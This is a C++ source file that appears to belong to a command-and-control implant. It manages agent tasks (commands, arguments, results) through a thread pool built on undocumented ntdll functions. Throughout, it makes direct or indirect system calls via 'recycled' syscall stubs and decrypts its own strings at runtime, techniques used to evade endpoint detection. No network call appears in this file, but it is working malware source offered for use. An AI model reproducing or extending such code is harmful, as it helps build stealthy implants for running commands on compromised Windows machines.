#include "Syscalls.hpp"
#include "Instance.hpp"
#include "Win32.hpp"
#include "ThreadPool.hpp"
#include "SecureString.hpp"
#include "SecureException.hpp"
#include "StringCrypt.hpp"

std::vector<HANDLE> ThreadPool::CompletionHandles;
std::vector<WorkDetails> ThreadPool::WorkDetailsList;

// Custom copy constructor
SecureTask::SecureTask(const SecureTask& other)
	: ID(other.ID), AgentID(other.AgentID), Timeout(other.Timeout), Active(other.Active),
	Success(other.Success), InQueue(other.InQueue), TimedOut(other.TimedOut) {
	Command = other.Command ? std::make_unique<SecureString>(*other.Command) : nullptr;
	CreateTime = other.CreateTime ? std::make_unique<SecureString>(*other.CreateTime) : nullptr;
	EndTime = other.EndTime ? std::make_unique<SecureString>(*other.EndTime) : nullptr;
	Result = other.Result ? std::make_unique<SecureString>(*other.Result) : nullptr;

	// Deep copy of Arguments
	for (const auto& arg : other.Arguments) {
		Arguments.push_back(arg ? std::make_unique<SecureString>(*arg) : nullptr);
	}
}

// Custom copy assignment operator
SecureTask& SecureTask::operator=(const SecureTask& other) {
	if (this != &other) {
		ID = other.ID;
		AgentID = other.AgentID;
		Timeout = other.Timeout;
		Active = other.Active;
		Success = other.Success;
		InQueue = other.InQueue;
		TimedOut = other.TimedOut;
		Command = other.Command ? std::make_unique<SecureString>(*other.Command) : nullptr;
		CreateTime = other.CreateTime ? std::make_unique<SecureString>(*other.CreateTime) : nullptr;
		EndTime = other.EndTime ? std::make_unique<SecureString>(*other.EndTime) : nullptr;
		Result = other.Result ? std::make_unique<SecureString>(*other.Result) : nullptr;

		Arguments.clear();
		for (const auto& arg : other.Arguments) {
			Arguments.push_back(arg ? std::make_unique<SecureString>(*arg) : nullptr);
		}
	}
	return *this;
}

SecureTask::SecureTask() = default;
SecureTask::~SecureTask() = default;

void ThreadPool::SubmitWorkItem(PTP_WORK_CALLBACK WorkItemCallback, PVOID WorkContext, SecureTask* Task, int BatchSize) {
	pTpAllocPool _pTpAllocPool = (pTpAllocPool)Win32::NtdllTable.pTpAllocPool.pAddress;
	pTpAllocWork _pTpAllocWork = (pTpAllocWork)Win32::NtdllTable.pTpAllocWork.pAddress;
	pTpPostWork _pTpPostWork = (pTpPostWork)Win32::NtdllTable.pTpPostWork.pAddress;
	pTpSetPoolMaxThreads _pTpSetPoolMaxThreads = (pTpSetPoolMaxThreads)Win32::NtdllTable.pTpSetPoolMaxThreads.pAddress;
	pTpSetPoolMinThreads _pTpSetPoolMinThreads = (pTpSetPoolMinThreads)Win32::NtdllTable.pTpSetPoolMinThreads.pAddress;

	PTP_POOL pool;
	PTP_WORK work;
	TP_CALLBACK_ENVIRON pcbe;
	WorkDetails details = { 0 };

	OBJECT_ATTRIBUTES ObjectAttributes;
	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);

	SyscallPrepare(SystemCalls::SysTable.SysNtCreateEvent.wSyscallNr, SystemCalls::SysTable.SysNtCreateEvent.pRecycled);
	Instance::NtStatus = SysNtCreateEvent(
		&Task->CompletionEvent,         // EventHandle
		EVENT_ALL_ACCESS,               // DesiredAccess
		&ObjectAttributes,              // ObjectAttributes
		NotificationEvent,              // EventType (NotificationEvent for manual reset)
		FALSE                           // InitialState (FALSE for non-signaled)
	);

	if (!NT_SUCCESS(Instance::NtStatus)) {
		throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::CREATINGEVENT_CRYPT), Instance::NtStatus));
	}
	CompletionHandles.push_back(Task->CompletionEvent);

	// Allocate a new thread pool
	Instance::NtStatus = _pTpAllocPool(&pool, NULL);
	if (!NT_SUCCESS(Instance::NtStatus)) {
		throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::ALLOCATINGANEWTHREADPOOL_CRYPT), Instance::NtStatus));
	}
	details.Pool = pool;

	/*
	* Initialize the callback environment, inline function
	* https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-initializethreadpoolenvironment
	*/
	MyTpInitializeCallbackEnviron(&pcbe);

	/*
	* Set the pool to the callback environment, inline function
	* https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-setthreadpoolcallbackpool
	*/
	MyTpSetCallbackThreadpool(&pcbe, pool);

	// Correctly allocate a work item with the callback and the callback environment
	Instance::NtStatus = _pTpAllocWork(&work, (PTP_WORK_CALLBACK)WorkItemCallback, WorkContext, &pcbe);
	if (!NT_SUCCESS(Instance::NtStatus)) {
		throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::ALLOCATINGAWORKITEM_CRYPT), Instance::NtStatus));
	}
	details.Work = work;

	// Add the details to the global vector
	WorkDetailsList.push_back(details);

	// Post the work item to the thread pool
	Instance::NtStatus = _pTpPostWork(work);
	if (!NT_SUCCESS(Instance::NtStatus)) {
		throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::POSTINGTHEWORKITEMTOTHETHREADPOOL_CRYPT), Instance::NtStatus));
	}
}

void ThreadPool::WaitForCompletion(DWORD milliseconds, std::vector<SecureTask>* tasks) {
	if (CompletionHandles.empty()) {
		// No handles to wait on
		return;
	}

	NTSTATUS status;
	LARGE_INTEGER timeout;
	timeout.QuadPart = -static_cast<LONGLONG>(milliseconds) * 10000LL; // Convert to 100-nanosecond units

	SyscallPrepare(SystemCalls::SysTable.SysNtWaitForMultipleObjects.wSyscallNr, SystemCalls::SysTable.SysNtWaitForMultipleObjects.pRecycled);
	status = SysNtWaitForMultipleObjects(
		CompletionHandles.size(), // Number of handles to wait for
		CompletionHandles.data(), // Pointer to the handles array
		WaitAll,           // Wait type - wait for all handles
		FALSE,             // Not alertable
		&timeout           // Timeout
	);

	switch (status) {
	case STATUS_WAIT_0:
		// All handles were signaled before the timeout
		ResetVectors();
		// Mark all tasks as successful
		for (size_t i = 0; i < tasks->size(); ++i) {
			(*tasks)[i].TimedOut = false;
		}
		return;
	case STATUS_TIMEOUT:
		// The wait operation timed out, try to find which ones are still running
		for (size_t i = 0; i < tasks->size(); ++i) {
			LARGE_INTEGER timeout;
			timeout.QuadPart = 0;

			SyscallPrepare(SystemCalls::SysTable.SysNtWaitForSingleObject.wSyscallNr, SystemCalls::SysTable.SysNtWaitForSingleObject.pRecycled);
			NTSTATUS individualStatus = SysNtWaitForSingleObject((*tasks)[i].CompletionEvent, FALSE, &timeout);
			if (NT_SUCCESS(individualStatus)) {
				(*tasks)[i].TimedOut = false;
			}
			else {
				// Mark that the task failed due to a timeout
				(*tasks)[i].TimedOut = true;
			}
		}
		ResetVectors();
		return;
	}
}

void ThreadPool::ResetVectors() {
	CompletionHandles.clear();

	// Release work and pool objects
	for (auto& details : WorkDetailsList) {
		if (details.Work) {
			pTpReleaseWork _pTpReleaseWork = (pTpReleaseWork)Win32::NtdllTable.pTpReleaseWork.pAddress;
			_pTpReleaseWork(details.Work);
		}
		if (details.Pool) {
			pTpReleasePool _pTpReleasePool = (pTpReleasePool)Win32::NtdllTable.pTpReleasePool.pAddress;
			_pTpReleasePool(details.Pool);
		}
	}

	WorkDetailsList.clear();
}